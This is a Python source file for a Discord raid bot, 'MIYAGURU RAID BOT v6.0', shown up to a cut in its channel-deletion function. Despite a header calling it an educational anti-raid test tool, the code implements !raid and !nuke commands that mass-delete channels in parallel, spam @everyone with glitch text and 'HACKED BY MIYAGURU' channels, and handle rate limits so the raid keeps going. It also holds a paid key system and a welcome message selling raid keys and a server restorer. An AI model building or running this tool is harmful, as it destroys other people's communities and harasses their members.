"""
╔══════════════════════════════════════════════════════╗
║            MIYAGURU RAID BOT v6.0                    ║
║      Para testar Anti-Raid — USO APENAS EM          ║
║      SERVIDOR PRÓPRIO OU COM PERMISSÃO              ║
╚══════════════════════════════════════════════════════╝

AVISO: Este bot é APENAS para fins educacionais e
teste de segurança. Use apenas em servidores que
você possui ou tem permissão explícita para testar.
"""

import discord
from discord import PermissionOverwrite
import asyncio
import os
import json
import random
import time
import string
import datetime

# ============================================================
# CONFIGURAÇÕES
# ============================================================

TOKEN = os.getenv("RAID_BOT_TOKEN", "COLE_SEU_TOKEN_AQUI")

# DONO — Apenas esse ID tem acesso total sem key
OWNER_ID = 1490921333750759487

# Nomes dos canais para criar
CHANNEL_NAMES = [
    "Dominado por Miyaguru",
    "HACKED BY MIYAGURU",
    "R A I D",
    "SERVER TAKEN OVER",
    "HACKED",
]

# Quantas mensagens enviar por canal
MSG_PER_CHANNEL = 15

# Mensagens corrompidas/glitch
GLITCH_MESSAGES = [
    "@everyone",
    "̷̧̛̖̣̤̥̦̩̫̪̗̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅ ̶̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ ̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚",
    "̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ͅͅ @everyone",
    "░▒▓█ HACKED █▓▒░",
    "◆◇◈◉◎●○◐◑◒◓◔◕◖◗◘◙◚",
    "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄",
    "╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗",
    "┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐┌─┐",
    "▓▒░ CORRUPTED ░▒▓",
    "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏",
    "█▓▒░ RAID ░▒▓█",
    "╭───「 RAID 」───╮\n│ Dominado por Miyaguru │\n╰────────────────╯",
    "̷̢̧̛̖̣̤̥̦̩̫̪̗̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚",
    "⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣀",
    "̸̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́͆͊͋͌̕̚ @everyone",
    "▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄",
    "═══╗\nHACKED BY\nMIYAGURU\n═══╝",
]

# ============================================================
# SETUP DO BOT
# ============================================================

intents = discord.Intents.all()
bot = discord.Bot(intents=intents)

RAID_ACTIVE = False
BACKUP_FILE = "server_backup.json"
KEYS_FILE = "bot_keys.json"
SERVER_CONFIGS_FILE = "server_configs.json"  # Configs persistentes (funciona mesmo banido)


# ============================================================
# SISTEMA DE KEYS
# ============================================================

def load_keys():
    """Carrega keys do arquivo JSON"""
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"keys": {}}


def save_keys(data):
    """Salva keys no arquivo JSON"""
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ============================================================
# SISTEMA DE CONFIGS PERSISTENTES
# ============================================================

def load_server_configs():
    """Carrega configs persistentes dos servidores salvos"""
    if os.path.exists(SERVER_CONFIGS_FILE):
        with open(SERVER_CONFIGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {"servers": {}}


def save_server_configs(data):
    """Salva configs persistentes no arquivo JSON"""
    with open(SERVER_CONFIGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# Removido: audit_restore (não funciona - Discord não guarda nomes no Audit Log)
# Use !restore (backup automático) ou !saveconfig para restaurar servidores


async def smart_clean_restore(guild):
    """Restauração inteligente sem backup: apaga canais de raid e cria servidor limpo padrão.
    
    Usado quando não há backup nem config persistente.
    Apaga todos os canais/categorias existentes e cria uma estrutura padrão limpa.
    """
    import time
    
    print(f"\n[SMART-RESTORE] Iniciando restauração limpa em: {guild.name} ({guild.id})")
    
    # === FASE 1: Apagar todos os canais e categorias existentes ===
    print("[SMART-RESTORE] Apagando canais e categorias...")
    
    all_items = list(guild.channels)
    deleted_channels = 0
    deleted_cats = 0
    
    # Apagar em paralelo
    async def delete_item(item):
        try:
            await item.delete()
            return True
        except Exception:
            return False
    
    tasks = [delete_item(item) for item in all_items]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for r, item in zip(results, all_items):
        if r is True:
            if isinstance(item, discord.CategoryChannel):
                deleted_cats += 1
            else:
                deleted_channels += 1
    
    print(f"       {deleted_channels} canais apagados")
    print(f"       {deleted_cats} categorias apagadas")
    
    # Esperar o Discord processar
    await asyncio.sleep(3)
    
    # === FASE 2: Criar categorias padrão ===
    print("[SMART-RESTORE] Criando categorias padrão...")
    
    categories_data = [
        ("INFORMAÇÕES", 0),
        ("COMUNIDADE", 1),
        ("VENDAS", 2),
        ("Voz", 3),
    ]
    
    cat_map = {}
    for cat_name, position in categories_data:
        try:
            cat = await guild.create_category(cat_name)
            cat_map[cat_name] = cat
            print(f"       Categoria criada: {cat_name}")
        except Exception as e:
            print(f"       Erro ao criar categoria {cat_name}: {e}")
    
    # === FASE 3: Criar canais padrão ===
    print("[SMART-RESTORE] Criando canais padrão...")
    
    channels_data = [
        # INFORMAÇÕES
        ("👋︳bem-vindo", "INFORMAÇÕES", "text", None),
        ("📜︳regras", "INFORMAÇÕES", "text", None),
        ("❓︳faq", "INFORMAÇÕES", "text", None),
        ("📦︳catalogo", "INFORMAÇÕES", "text", None),
        ("📢︳anuncios", "INFORMAÇÕES", "text", None),
        
        # COMUNIDADE
        ("💬︳chat-geral", "COMUNIDADE", "text", None),
        ("📸︳midias", "COMUNIDADE", "text", None),
        ("⌨️︳comandos", "COMUNIDADE", "text", None),
        
        # VENDAS
        ("🎫︳tickets", "VENDAS", "text", None),
        ("🧾︳comprovantes", "VENDAS", "text", None),
        
        # VOZ
        ("🔊︳Voz 1", "Voz", "voice", None),
        ("🔊︳Voz 2", "Voz", "voice", None),
    ]
    
    created_channels = 0
    created_errors = 0
    
    for ch_name, cat_name, ch_type, topic in channels_data:
        cat = cat_map.get(cat_name)
        try:
            if ch_type == "voice":
                await guild.create_voice_channel(ch_name, category=cat)
            else:
                await guild.create_text_channel(ch_name, category=cat, topic=topic)
            created_channels += 1
        except Exception as e:
            created_errors += 1
            print(f"       Erro ao criar {ch_name}: {e}")
    
    print(f"       {created_channels} canais criados")
    
    # === FASE 4: Salvar config automaticamente ===
    print("[SMART-RESTORE] Salvando config...")
    try:
        await save_server_config(guild)
        print("       Config salva!")
    except Exception as e:
        print(f"       Erro ao salvar config: {e}")
    
    # Resumo
    msg = (
        f"♻️ **Restauração LIMPA CONCLUÍDA!**\n\n"
        f"📋 **Relatório:**\n"
        f"• Canais apagados: **{deleted_channels}**\n"
        f"• Categorias apagadas: **{deleted_cats}**\n"
        f"• Categorias criadas: **{len(cat_map)}**\n"
        f"• Canais criados: **{created_channels}**\n"
        f"• Erros: **{created_errors}**\n\n"
        f"📁 **Estrutura criada:**\n"
        f"• INFORMAÇÕES: bem-vindo, regras, FAQ, catálogo, anúncios\n"
        f"• COMUNIDADE: chat-geral, mídias, comandos\n"
        f"• VENDAS: tickets, comprovantes\n"
        f"• VOZ: 2 canais de voz\n\n"
        f"💾 Config salva automaticamente!\n\n"
        f"⚠️ **Atenção:** Nenhum backup foi encontrado.\n"
        f"Este é um servidor limpo com estrutura padrão.\n"
        f"Use `!saveconfig` após ajustar para salvar como base."
    )
    
    print(f"\n[SMART-RESTORE] CONCLUÍDO! {created_channels} canais criados")
    return True, msg


async def save_server_config(guild):
    """Salva as configs do servidor de forma persistente (mesmo se o bot for banido)"""
    print(f"\n[CONFIG] Salvando configs do servidor {guild.name} ({guild.id})...")

    config = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "owner_id": guild.owner_id,
        "owner_name": str(guild.owner) if guild.owner else None,
        "member_count": guild.member_count,
        "icon_url": str(guild.icon.url) if guild.icon else None,
        "saved_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "categories": [],
        "roles": [],
        "channels": [],
    }

    # --- Categorias com permissões ---
    for cat in guild.categories:
        cat_data = {
            "name": cat.name,
            "position": cat.position,
            "permissions": [],
        }
        for target, overwrite in cat.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
                "target_name": target.name if hasattr(target, "name") else str(target.id),
            }
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            cat_data["permissions"].append(perm_entry)
        config["categories"].append(cat_data)

    # --- Roles com permissões ---
    for role in guild.roles:
        if role.is_default():
            continue
        role_data = {
            "name": role.name,
            "color": f"{role.color.r},{role.color.g},{role.color.b}",
            "permissions": role.permissions.value,
            "position": role.position,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
        }
        config["roles"].append(role_data)

    # --- Canais com permissões ---
    for channel in guild.channels:
        if isinstance(channel, discord.CategoryChannel):
            continue
        channel_data = {
            "name": channel.name,
            "type": str(channel.type),
            "category_name": channel.category.name if channel.category else None,
            "position": channel.position,
            "topic": getattr(channel, "topic", None),
            "slowmode_delay": getattr(channel, "slowmode_delay", 0),
            "nsfw": getattr(channel, "is_nsfw", lambda: False)(),
            "permissions": [],
        }
        for target, overwrite in channel.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
                "target_name": target.name if hasattr(target, "name") else str(target.id),
            }
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            channel_data["permissions"].append(perm_entry)
        config["channels"].append(channel_data)

    # Salvar no arquivo persistente
    configs = load_server_configs()
    configs["servers"][str(guild.id)] = config
    save_server_configs(configs)

    print(f"       {len(config['categories'])} categorias")
    print(f"       {len(config['roles'])} roles")
    print(f"       {len(config['channels'])} canais")
    print(f"[CONFIG] Salvo em: {SERVER_CONFIGS_FILE}")
    return config


async def restore_from_config(guild, guild_id=None):
    """Restaura um servidor a partir das configs persistentes (funciona mesmo sem backup local)"""
    configs = load_server_configs()

    # Determinar qual servidor restaurar
    if guild_id:
        config = configs["servers"].get(str(guild_id))
    else:
        config = configs["servers"].get(str(guild.id))

    if not config:
        return False, "Nenhuma config salva encontrada para este servidor!"

    print(f"\n[RESTORE-CONFIG] Restaurando servidor: {config.get('guild_name', '?')}")

    # Apagar tudo existente em paralelo
    print("[RESTORE-CONFIG] Apagando canais e categorias existentes...")
    async def delete_fast(item):
        try:
            await item.delete()
            return True
        except Exception:
            return False

    all_items = list(guild.channels) + list(guild.categories)
    tasks = [delete_fast(item) for item in all_items]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    deleted_channels = 0
    deleted_cats = 0
    for r, item in zip(results, all_items):
        if r is True:
            if isinstance(item, discord.CategoryChannel):
                deleted_cats += 1
            else:
                deleted_channels += 1

    print(f"       {deleted_channels} canais apagados")
    print(f"       {deleted_cats} categorias apagadas")
    await asyncio.sleep(2)

    restored = {"categories": 0, "channels": 0}

    # 1. Categorias com permissões
    print("[RESTORE-CONFIG] Criando categorias...")
    cat_map = {}
    for cat_data in sorted(config.get("categories", []), key=lambda x: x.get("position", 0)):
        try:
            overwrites = rebuild_overwrites(guild, cat_data.get("permissions", []))
            new_cat = await guild.create_category(name=cat_data["name"], overwrites=overwrites)
            cat_map[cat_data["name"]] = new_cat
            restored["categories"] += 1
        except Exception as e:
            print(f"       Erro categoria {cat_data['name']}: {e}")
    print(f"       {restored['categories']} categorias")

    # 3. Canais EM PARALELO (depois que categorias existem)
    print("[RESTORE-CONFIG] Criando canais (paralelo)...")

    async def create_channel_from_config(ch_data):
        category = None
        cat_name = ch_data.get("category_name")
        if cat_name and cat_name in cat_map:
            category = cat_map[cat_name]

        overwrites = rebuild_overwrites(guild, ch_data.get("permissions", []))
        ch_type = ch_data["type"].lower()
        name = ch_data["name"]

        if "text" in ch_type:
            ch = await guild.create_text_channel(
                name=name, category=category,
                topic=ch_data.get("topic"),
                slowmode_delay=ch_data.get("slowmode_delay", 0),
                nsfw=ch_data.get("nsfw", False),
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        elif "voice" in ch_type:
            ch = await guild.create_voice_channel(
                name=name, category=category,
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        else:
            ch = await guild.create_text_channel(
                name=name, category=category,
                topic=ch_data.get("topic"),
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        return ch

    sorted_channels = sorted(config.get("channels", []), key=lambda x: x.get("position", 0))
    tasks = [create_channel_from_config(ch_data) for ch_data in sorted_channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    restored["channels"] = sum(1 for r in results if r is not None and not isinstance(r, Exception))

    print(f"       {restored['channels']} canais")
    print(f"\n[RESTORE-CONFIG] CONCLUÍDO!")

    return True, (
        f"✅ Restaurado (do config persistente)!\n"
        f"🗑️ {deleted_channels} canais apagados\n"
        f"🗂️ {deleted_cats} categorias apagadas\n"
        f"📁 {restored['categories']} categorias recriadas\n"
        f"📂 {restored['channels']} canais recriados\n"
        f"🔒 Permissões aplicadas"
    )


def generate_key(length=24):
    """Gera uma key aleatória"""
    chars = string.ascii_uppercase + string.digits
    return "MIYA-" + "-".join("".join(random.choices(chars, k=4)) for _ in range(length // 4))


def parse_duration(duration_str):
    """Converte duração em segundos. Retorna None se lifetime."""
    d = duration_str.strip().lower()
    if d == "lifetime":
        return None  # Lifetime = nunca expira
    if d == "30m" or d == "30":
        return 30 * 60
    if d == "1h" or d == "1h":
        return 1 * 3600
    if d == "30d" or d == "30d":
        return 30 * 86400
    if d == "1y" or d == "1ano" or d == "1year":
        return 365 * 86400
    if d == "2y" or d == "2anos" or d == "2year":
        return 730 * 86400
    # Tentar interpretar segundos direto
    try:
        return int(d)
    except ValueError:
        return None


def format_remaining(seconds):
    """Formata segundos restantes em texto legível"""
    if seconds is None:
        return "♾️ Lifetime"
    if seconds <= 0:
        return "❌ Expirada"
    if seconds < 60:
        return f"{int(seconds)}s restantes"
    if seconds < 3600:
        mins = int(seconds // 60)
        return f"{mins}min restantes"
    if seconds < 86400:
        hours = int(seconds // 3600)
        mins = int((seconds % 3600) // 60)
        return f"{hours}h {mins}min restantes"
    days = int(seconds // 86400)
    hours = int((seconds % 86400) // 3600)
    return f"{days} dias {hours}h restantes"


def is_key_valid(key_data):
    """Verifica se uma key ainda é válida"""
    if key_data.get("expires") is None:
        return True  # Lifetime
    return time.time() < key_data["expires"]


# ============================================================
# EVENTOS
# ============================================================

@bot.event
async def on_ready():
    print("=" * 50)
    print("  MIYAGURU RAID BOT v6.0 — ONLINE")
    print(f"  Logado como: {bot.user}")
    print(f"  ID: {bot.user.id}")
    print(f"  Owner ID: {OWNER_ID}")
    print("=" * 50)
    print("\nComandos do bot:")
    print("  !raid          — RAID COMPLETO (prioridade: canais)\n")
    print("                 Apaga canais + categorias\n")
    print("                 Cria 50 canais + 15 msgs @everyone")
    print("  !nuke          — Apaga tudo + cria 100 canais + spam")
    print("  !raid stop     — Para")
    print("  !backup        — Backup com permissões")
    print("  !restore       — Restaurar com permissões")
    print("\nComandos de Key (só Owner):")
    print("  !key gen <duração>  — Gerar key")
    print("  !keys               — Painel de keys")
    print("  !key revoke <key>   — Revogar key")
    print("  !help               — Ajuda")
    print("\nUso por outros: primeiro use !use <key>")
    print("\n" + "=" * 50)

    # Auto-salva configs de todos os servidores ao iniciar
    print("\n[AUTO-CONFIG] Escaneando e salvando configs de todos os servidores...")
    for g in bot.guilds:
        try:
            size_type, ch_count, _, _ = detect_server_size(g)
            cat_count = len(g.categories)
            role_count = len([r for r in g.roles if not r.is_default()])
            await save_server_config(g)
            print(f"       ✅ {g.name} ({g.id}) | {ch_count} canais | {cat_count} cats | {role_count} roles | Método: {size_type}")
        except Exception as e:
            print(f"       ❌ {g.name}: {e}")
    print(f"[AUTO-CONFIG] {len(bot.guilds)} servidores processados")


@bot.event
async def on_guild_join(guild):
    """Quando o bot entra num servidor novo, escaneia e salva as configs automaticamente.
    NÃO sobrescreve backup existente (protege backup original contra raid/nuke)."""
    print(f"\n[GUILD JOIN] Bot adicionado ao servidor: {guild.name} ({guild.id})")
    print(f"             Dono: {guild.owner} ({guild.owner_id})")
    print(f"             Membros: {guild.member_count}")
    try:
        await asyncio.sleep(3)  # Espera o bot carregar tudo
        ch_count = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
        cat_count = len(guild.categories)
        role_count = len([r for r in guild.roles if not r.is_default()])
        print(f"[SCAN] {ch_count} canais | {cat_count} categorias | {role_count} roles")
        
        # Verificar se já existe backup para este servidor
        configs = load_server_configs()
        existing = configs["servers"].get(str(guild.id))
        
        if existing:
            existing_channels = existing.get("channels", [])
            first_name = existing_channels[0].get("name", "") if existing_channels else ""
            raid_names = ["hacked", "hacked-by-miyaguru", "r-a-i-d", "dominado-por-miyaguru"]
            
            # Se o backup existente é do mesmo servidor e NÃO é raid, não sobrescreve
            if existing.get("guild_id") == guild.id and first_name not in raid_names:
                print(f"[GUILD JOIN] ✅ Backup existente encontrado ({len(existing_channels)} canais) — não sobrescrevendo!")
                return
            else:
                print(f"[GUILD JOIN] Backup existente parece ser de raid — atualizando...")
        
        config = await save_server_config(guild)
        print(f"[GUILD JOIN] ✅ Configs salvas automaticamente!")
    except Exception as e:
        print(f"[GUILD JOIN] Erro ao salvar: {e}")


@bot.event
async def on_guild_remove(guild):
    """Quando o bot é removido/banido, registra o evento"""
    print(f"\n[GUILD REMOVE] Bot removido do servidor: {guild.name} ({guild.id})")
    print(f"               (As configs já estão salvas em server_configs.json)")


@bot.event
async def on_member_join(member):
    """Envia guia de boas-vindas ao servidor de vendas"""
    guild = member.guild
    # Verifica se o servidor tem a estrutura de shop (categoria Informações)
    info_cat = discord.utils.get(guild.categories, name_contains="INFORMAÇÕES")
    if not info_cat:
        return
    
    # Busca IDs dos canais
    regras_ch = discord.utils.get(guild.text_channels, name_contains="regras")
    catalogo_ch = discord.utils.get(guild.text_channels, name_contains="catalogo")
    ticket_ch = discord.utils.get(guild.text_channels, name_contains="abrir-ticket")
    
    regras_id = regras_ch.id if regras_ch else 0
    catalogo_id = catalogo_ch.id if catalogo_ch else 0
    ticket_id = ticket_ch.id if ticket_ch else 0
    
    # Envia DM com o guia
    guia_embed = discord.Embed(
        title="👋 Bem-vindo ao Miyaguru Shop!",
        description=(
            f"Olá, {member.mention}! Bem-vindo(a) ao nosso servidor!\n\n"
            "**📋 Primeiros passos:**\n"
            f"1. Leia as regras em <#{regras_id}> 📜\n"
            f"2. Confira nosso catálogo em <#{catalogo_id}> 📦\n"
            f"3. Abra um ticket em <#{ticket_id}> 🎫 pra comprar\n\n"
            "**🛡️ Nossos Serviços:**\n"
            "• Keys do bot Miyaguru — **R$1 a R$80**\n"
            "  └ De 30 minutos até Lifetime\n\n"
            "• Restaurador de servidor — **R$2**\n"
            "  └ Restaura canais, categorias e permissões em segundos\n\n"
            "**💬 Como funciona?**\n"
            "1. Abra um ticket no canal de tickets\n"
            "2. Escolha o que precisa\n"
            "3. Faça o pagamento (PIX)\n"
            "4. Pronto! Tudo feito rapidinho\n\n"
            "**⚡ Por que escolher a gente?**\n"
            "• Atendimento rápido e eficiente\n"
            "• Preços acessíveis\n"
            "• Resultados garantidos\n\n"
            "Qualquer dúvida, abra um ticket! 🎫"
        ),
        color=discord.Color.blue()
    )
    guia_embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    guia_embed.set_footer(text="Miyaguru Shop — Desde 2024")
    
    try:
        await member.send(embed=guia_embed)
    except Exception:
        # Se não conseguiu enviar DM, manda no canal bem-vindo
        bem_vindo = discord.utils.get(guild.text_channels, name_contains="bem-vindo")
        if bem_vindo:
            try:
                await bem_vindo.send(embed=guia_embed)
            except Exception:
                pass
    
    print(f"[WELCOME] Bem-vindo enviado para: {member.name} ({member.id}) em {guild.name}")


# ============================================================
# BACKUP / RESTORE COM PERMISSÕES
# ============================================================

async def save_backup(guild):
    """Salva backup COMPLETO com permissões (só se ainda não existir)"""
    # Não sobrescreve se já existe backup (evita perder backup original)
    if os.path.exists(BACKUP_FILE):
        try:
            with open(BACKUP_FILE, "r", encoding="utf-8") as f:
                existing = json.load(f)
            existing_guild = existing.get("guild_id")
            existing_channels = existing.get("channels", [])
            # Se o backup é do mesmo servidor e tem canais válidos (não raid), não sobrescreve
            if existing_guild == guild.id and len(existing_channels) > 10:
                first_channel = existing_channels[0].get("name", "")
                if first_channel not in ["hacked", "hacked-by-miyaguru", "r-a-i-d", "dominado-por-miyaguru"]:
                    print("[BACKUP] Backup existente encontrado — não sobrescrevendo")
                    print(f"       Backup original de {len(existing_channels)} canais salvo")
                    return existing
        except Exception:
            pass

    print("\n[BACKUP] Salvando backup do servidor...")

    backup_data = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "timestamp": None,
        "categories": [],
        "roles": [],
        "channels": [],
    }

    # --- Categorias com permissões completas ---
    for cat in guild.categories:
        cat_data = {
            "id": cat.id,
            "name": cat.name,
            "position": cat.position,
            "permissions": [],
        }
        for target, overwrite in cat.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
            }
            # No py-cord, iterar sobre overwrite retorna (perm_name, value) tuples
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            cat_data["permissions"].append(perm_entry)
        backup_data["categories"].append(cat_data)

    # --- Roles com permissões completas ---
    for role in guild.roles:
        if role.is_default():
            continue
        role_perms = role.permissions.value
        role_data = {
            "id": role.id,
            "name": role.name,
            "color": f"{role.color.r},{role.color.g},{role.color.b}",
            "permissions": role_perms,
            "position": role.position,
            "hoist": role.hoist,
            "mentionable": role.mentionable,
        }
        backup_data["roles"].append(role_data)

    # --- Canais com permissões completas ---
    for channel in guild.channels:
        # Ignora categorias (já salvas acima)
        if isinstance(channel, discord.CategoryChannel):
            continue

        channel_data = {
            "id": channel.id,
            "name": channel.name,
            "type": str(channel.type),
            "category_id": channel.category.id if channel.category else None,
            "category_name": channel.category.name if channel.category else None,
            "position": channel.position,
            "topic": getattr(channel, "topic", None),
            "slowmode_delay": getattr(channel, "slowmode_delay", 0),
            "permissions": [],
        }
        for target, overwrite in channel.overwrites.items():
            perm_entry = {
                "target_id": target.id,
                "target_type": "role" if isinstance(target, discord.Role) else "member",
            }
            # No py-cord, iterar sobre overwrite retorna (perm_name, value) tuples
            for perm_name, val in overwrite:
                if val is None:
                    continue
                perm_entry[perm_name] = {"allow": val, "deny": not val}
            channel_data["permissions"].append(perm_entry)
        backup_data["channels"].append(channel_data)

    backup_data["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")

    with open(BACKUP_FILE, "w", encoding="utf-8") as f:
        json.dump(backup_data, f, indent=2, ensure_ascii=False)

    print(f"       {len(backup_data['categories'])} categorias (com permissões)")
    print(f"       {len(backup_data['roles'])} roles (com permissões)")
    print(f"       {len(backup_data['channels'])} canais (com permissões)")
    print(f"[BACKUP] Salvo em: {BACKUP_FILE}")
    print("       ⚠️  Este backup NAO sera sobrescrito ate ser deletado manualmente")
    return backup_data


def rebuild_overwrites(guild, perm_entries):
    """Reconstrói os overwrites a partir dos dados do backup"""
    overwrites = {}
    for entry in perm_entries:
        # Encontrar o target (role ou member)
        target_id = entry["target_id"]
        target_type = entry["target_type"]

        if target_type == "role":
            target = guild.get_role(target_id)
        else:
            target = guild.get_member(target_id)

        if target is None:
            continue

        # Construir PermissionOverwrite
        kwargs = {}
        for key, value in entry.items():
            if key in ("target_id", "target_type"):
                continue
            if isinstance(value, dict) and "allow" in value and "deny" in value:
                if value["allow"]:
                    kwargs[key] = True
                elif value["deny"]:
                    kwargs[key] = False
                else:
                    kwargs[key] = None  # Permissão neutra

        if kwargs:
            try:
                overwrites[target] = PermissionOverwrite(**kwargs)
            except Exception as e:
                print(f"       [WARN] Erro ao criar overwrite para {target}: {e}")

    return overwrites


async def restore_backup(guild):
    """Apaga todos os canais + categorias + recria tudo com permissões"""
    if not os.path.exists(BACKUP_FILE):
        return False, "Nenhum backup encontrado!"

    print("\n[RESTORE] Carregando backup...")

    with open(BACKUP_FILE, "r", encoding="utf-8") as f:
        backup = json.load(f)

    restored = {"categories": 0, "channels": 0}

    # 0. APAGAR TODOS OS CANAIS E CATEGORIAS EM PARALELO
    print("[RESTORE] Apagando todos os canais e categorias (paralelo)...")

    async def delete_fast(item):
        try:
            await item.delete()
            return True
        except Exception:
            return False

    # Apagar tudo em paralelo: canais + categorias
    all_items = list(guild.channels) + list(guild.categories)
    tasks = [delete_fast(item) for item in all_items]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    deleted_channels = 0
    deleted_cats = 0
    for r, item in zip(results, all_items):
        if r is True:
            if isinstance(item, discord.CategoryChannel):
                deleted_cats += 1
            else:
                deleted_channels += 1

    print(f"       {deleted_channels} canais apagados")
    print(f"       {deleted_cats} categorias apagadas")

    # Esperar um pouco pro Discord registrar as deleções
    await asyncio.sleep(2)

    # 1. Criar categorias (precisamos delas antes dos canais)
    print("[RESTORE] Criando categorias...")
    cat_map = {}
    for cat_data in sorted(backup.get("categories", []), key=lambda x: x.get("position", 0)):
        try:
            overwrites = rebuild_overwrites(guild, cat_data.get("permissions", []))
            new_cat = await guild.create_category(name=cat_data["name"], overwrites=overwrites)
            cat_map[cat_data["name"]] = new_cat
            restored["categories"] += 1
        except Exception as e:
            print(f"       Erro categoria {cat_data['name']}: {e}")
    print(f"       {restored['categories']} categorias")

    # 3. Criar canais EM PARALELO (depois que categorias existem)
    print("[RESTORE] Criando canais (paralelo)...")

    async def create_channel_from_backup(ch_data):
        category = None
        cat_name = ch_data.get("category_name")
        if cat_name and cat_name in cat_map:
            category = cat_map[cat_name]

        overwrites = rebuild_overwrites(guild, ch_data.get("permissions", []))
        ch_type = ch_data["type"].lower()
        name = ch_data["name"]

        if "text" in ch_type:
            ch = await guild.create_text_channel(
                name=name, category=category,
                topic=ch_data.get("topic"),
                slowmode_delay=ch_data.get("slowmode_delay", 0),
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        elif "voice" in ch_type:
            ch = await guild.create_voice_channel(
                name=name, category=category,
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        else:
            ch = await guild.create_text_channel(
                name=name, category=category,
                topic=ch_data.get("topic"),
                position=ch_data.get("position", 0),
                overwrites=overwrites,
            )
        return ch

    sorted_channels = sorted(backup.get("channels", []), key=lambda x: x.get("position", 0))
    tasks = [create_channel_from_backup(ch_data) for ch_data in sorted_channels]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    restored["channels"] = sum(1 for r in results if r is not None and not isinstance(r, Exception))

    print(f"       {restored['channels']} canais")
    print(f"\n[RESTORE] CONCLUÍDO!")

    return True, (
        f"✅ Restaurado!\n"
        f"🗑️ {deleted_channels} canais apagados\n"
        f"🗂️ {deleted_cats} categorias apagadas\n"
        f"📁 {restored['categories']} categorias recriadas\n"
        f"📂 {restored['channels']} canais recriados\n"
        f"🔒 Permissões aplicadas"
    )


# ============================================================
# RAID FUNCTIONS (PARALELO COM GATHER)
# ============================================================

async def delete_channel_fast(channel):
    """Apaga um canal"""
    try:
        await channel.delete()
        return True
    except Exception:
        return False


async def create_channel_fast(guild, name):
    """Cria um canal — sem retry, cria na base do possível"""
    try:
        channel = await guild.create_text_channel(name=name)
        return channel
    except Exception:
        return None


async def send_message_fast(channel, message, retries=3):
    """Envia uma mensagem com retry pra rate limit"""
    for attempt in range(retries):
        try:
            await channel.send(message)
            return True
        except Exception as e:
            error_msg = str(e).lower()
            if "rate" in error_msg or "429" in error_msg:
                wait = 0.5 * (attempt + 1)
                await asyncio.sleep(wait)
                continue
            else:
                return False
    return False


async def delete_channel_fast(channel):
    """Apaga um canal — sem retry, na base do possível"""
    try:
        await channel.delete()
        return True
    except Exception:
        return False


async def delete_channel_with_retry(channel, retries=3):
    """Apaga um canal com retry pra rate limit"""
    for attempt in range(retries):
        try:
            await channel.delete()
            return True
        except Exception as e:
            error_msg = str(e).lower()
            if "rate" in error_msg or "429" in error_msg:
                await asyncio.sleep(0.5 * (attempt + 1))
                continue
            return False
    return False


def detect_server_size(guild):
    """Detecta o tamanho do servidor e retorna o método ideal"""
    ch_count = len([ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)])
    if ch_count <= 50:
        return "small", ch_count, 0, 0       # (tipo, total, batch_size, delay)
    elif ch_count <= 150:
        return "medium", ch_count, 30, 0.5   # Lotes de 30, 0.5s delay
    else:
        return "large", ch_count, 30, 0.3    # Lotes de 30, 0.3s delay + retry


async def delete_all_channels(guild):
    """Apaga TODOS os canais — adapta pro tamanho do servidor"""
    size_type, total, batch_size, delay = detect_server_size(guild)
    channels = [ch for ch in list(guild.channels) if not isinstance(ch, discord.CategoryChannel)]
    print(f"      [SCAN] {len(channels)} canais encontrados para apagar")
    
    if size_type == "small":
